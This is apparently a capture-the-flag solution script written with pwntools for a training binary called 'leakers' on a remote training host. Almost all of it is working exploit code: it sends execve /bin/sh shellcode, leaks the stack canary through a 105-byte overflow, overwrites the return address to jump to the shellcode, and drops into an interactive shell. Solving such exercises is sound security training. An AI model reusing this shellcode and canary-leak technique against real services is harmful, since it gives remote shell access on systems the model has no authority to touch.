from pwn import *

#context.terminal = ['tmux','splitw','-h']

#r = process("./leakers")
r = remote("bin.training.jinblack.it", 2011)
#gdb.attach(r, gdbscript="""
#      b *0x401255
 #      """)
       
#input("wait")
shellcode = b"\x90\x90\x90\xEB\x0E\x48\x31\xC0\xB0\x3B\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05\xE8\xED\xFF\xFF\xFF/bin/sh\x00"
r.send(shellcode)
r.send("A"*105)
r.recvuntil(b"> ")
r.recv(105)
canary = u64(b"\x00"+r.recv(7))
print("canary: %#x" % canary)
payload = b"A"*104 + p64(canary) + b"D"*8 + p64(0x404080)
r.send(payload)
#payload = b"\x90"*(212-8) + b"\x60\xc0\x04\x08" + b"\x90"*16 + shellcode
#payload = payload.ljust(1000,b"A")
#print(payload)
#r.interactive()shellcode
#input("wait")
#r.recvuntil(b"What is your name?")
#r.send(payload)
r.interactive()